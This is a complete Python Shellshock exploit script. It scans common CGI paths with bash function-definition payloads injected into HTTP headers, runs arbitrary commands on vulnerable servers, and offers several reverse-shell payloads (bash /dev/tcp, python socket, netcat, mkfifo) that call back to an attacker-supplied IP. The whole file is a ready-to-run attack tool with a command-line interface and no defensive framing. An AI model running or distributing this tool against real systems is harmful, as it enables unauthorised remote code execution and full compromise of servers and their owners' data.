#!/usr/bin/python3
import requests
import argparse
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ShellshockExploit:
    def __init__(self, target, command="id", proxy=None):
        self.target = target
        self.command = command
        self.proxy = proxy
        self.vulnerable = False
        self.successful_path = None
        self.headers = {
            'User-Agent': '() { :;}; echo; echo "VULNERABLE: YES"'
        }
        # Common CGI paths to check
        self.cgi_paths = [
            '/cgi-bin/test.cgi',
            '/cgi-bin/index.cgi',
            '/cgi-bin/status',
            '/cgi-bin/system.cgi',
            '/cgi-bin/admin.cgi',
            '/cgi-bin/default.cgi',
            '/cgi-sys/entropysearch.cgi',
            '/cgi-sys/defaultwebpage.cgi',
            '/cgi-mod/index.cgi',
            '/cgi-bin/contact.cgi',
            '/cgi-bin/main.cgi',
            '/cgi-bin/search.cgi',
            '/cgi-bin/ping.cgi',
            '/cgi-bin/debug.cgi'
        ]

    def generate_payload(self, command):
        """Generate various Shellshock payload formats"""
        payloads = [
            f'() {{ :;}}; echo; {command}',
            f"() {{ :;}}; /bin/bash -c '{command}'",
            f'() {{ :;}}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
            f'() {{ :;}}; echo; echo "$({command})"',
            f'() {{ :;}}; {command} 2>&1',
            f'() {{ :;}}; echo "Content-Type: text/plain"; echo; {command}'
        ]
        return payloads

    def check_path(self, path):
        """Check if a specific CGI path is vulnerable"""
        try:
            url = f"{self.target.rstrip('/')}{path}"
            
            # Test headers for injection points
            headers_to_test = {
                'User-Agent': '() { :;}; echo; echo "VULNERABLE"',
                'Cookie': '() { :;}; echo; echo "VULNERABLE"',
                'Referer': '() { :;}; echo; echo "VULNERABLE"',
                'Host': '() { :;}; echo; echo "VULNERABLE"'
            }

            for header, payload in headers_to_test.items():
                test_headers = {'User-Agent': 'Mozilla/5.0'}
                test_headers[header] = payload

                response = requests.get(
                    url,
                    headers=test_headers,
                    verify=False,
                    proxies=self.proxy,
                    timeout=10
                )

                if "VULNERABLE" in response.text:
                    self.vulnerable = True
                    self.successful_path = path
                    print(f"[+] Vulnerable path found: {path}")
                    print(f"[+] Vulnerable header: {header}")
                    return True

            return False
        except requests.exceptions.ReadTimeout:
            pass
        except Exception as e:
            print(f"[-] Error checking {path}: {str(e)}")
            return False

    def execute_command(self):
        """Execute command on vulnerable target"""
        if not self.successful_path:
            print("[-] No vulnerable path found")
            return False

        url = f"{self.target.rstrip('/')}{self.successful_path}"
        payloads = self.generate_payload(self.command)

        for payload in payloads:
            try:
                headers = {
                    'User-Agent': payload,
                    'Cookie': payload,
                    'Referer': payload
                }

                response = requests.get(
                    url,
                    headers=headers,
                    verify=False,
                    proxies=self.proxy,
                    timeout=10
                )

                if response.status_code == 200:
                    print("[+] Command execution successful!")
                    print("[+] Response:")
                    print(response.text)
                    return True

            except Exception as e:
                print(f"[-] Error executing command: {str(e)}")
                continue

        return False

    def get_reverse_shell(self, attacker_ip, port):
        """Attempt to get a reverse shell"""
        reverse_shell_payloads = [
            f'/bin/bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1',
            f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            f'nc {attacker_ip} {port} -e /bin/bash',
            f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {port} >/tmp/f'
        ]

        for payload in reverse_shell_payloads:
            self.command = payload
            if self.execute_command():
                print(f"[+] Reverse shell payload sent. Check your listener on port {port}")
                return True

        return False

    def scan(self):
        """Scan target for Shellshock vulnerability"""
        print(f"[*] Starting Shellshock scan against {self.target}")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.check_path, self.cgi_paths)

        if self.vulnerable:
            print("[+] Target is vulnerable to Shellshock!")
            return True
        else:
            print("[-] Target does not appear to be vulnerable")
            return False

def main():
    parser = argparse.ArgumentParser(description='Shellshock Vulnerability Exploit')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://example.com)')
    parser.add_argument('-c', '--command', default='id', help='Command to execute (default: id)')
    parser.add_argument('--reverse-shell', action='store_true', help='Attempt to get a reverse shell')
    parser.add_argument('--attacker-ip', help='Attacker IP for reverse shell')
    parser.add_argument('--port', type=int, default=4444, help='Port for reverse shell (default: 4444)')
    parser.add_argument('--proxy', help='Proxy to use (e.g., http://127.0.0.1:8080)')

    args = parser.parse_args()

    if args.reverse_shell and not args.attacker_ip:
        print("[-] Attacker IP is required for reverse shell")
        sys.exit(1)

    proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    
    exploit = ShellshockExploit(args.target, args.command, proxy)

    if exploit.scan():
        if args.reverse_shell:
            exploit.get_reverse_shell(args.attacker_ip, args.port)
        else:
            exploit.execute_command()

if __name__ == '__main__':
    main()
